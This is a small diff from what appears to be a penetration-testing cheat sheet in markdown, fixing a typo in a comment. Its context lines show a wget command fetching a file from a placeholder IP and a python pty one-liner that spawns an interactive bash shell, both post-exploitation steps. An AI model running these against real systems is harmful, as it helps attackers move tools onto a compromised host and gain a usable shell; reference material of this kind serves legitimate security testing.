@@ -386,7 +386,7 @@ wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 
 ```bash
 # About: A command spawn a new shell using python
-# Download: MAy or may not be installed on server machine
+# Download: May or may not be installed on server machine
 
 # Usage 
 python3 -c 'import pty;pty.spawn("/bin/bash")'
